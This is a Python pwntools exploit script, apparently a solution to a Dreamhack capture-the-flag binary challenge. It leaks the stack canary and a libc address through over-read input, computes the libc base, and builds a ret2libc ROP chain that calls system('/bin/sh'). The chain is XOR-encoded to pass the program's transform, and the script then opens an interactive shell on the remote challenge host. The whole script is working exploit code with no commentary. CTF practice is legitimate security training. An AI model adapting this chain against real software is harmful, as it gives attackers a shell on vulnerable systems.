#!/usr/bin/python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+154
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 9925)
else:
    p = process([exe.path])
GDB()
sa(b'Input: ', b'AB'*12 + b'C')
p.recv(38)
canary = u64(b'\0' + p.recv(7))
log.info("canary : " + hex(canary))

sa(b'Input: ', b'AB'*20)
p.recv(53)
libc_leak = u64(p.recv(6) + b'\0\0')
log.info("libc_leak : " + hex(libc_leak))
libc.address = libc_leak - 0x29d90
log.info("libc base : " + hex(libc.address))


ret = libc.address + 0x0000000000029cd6
pop_rdi = libc.address + 0x000000000002a3e5
payload = b'\0'*24
payload += p64(canary)
payload += p64(1)
payload += p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym.system)

def decode(a):
    n = len(payload)
    X = [0] * n
    X[n-1] = payload[n-1]
    for i in range(n - 2, -1, -1):
        X[i] = payload[i] ^ X[i + 1]
    return bytes(X)

sa(b'Input: ', decode(payload))
p.interactive()

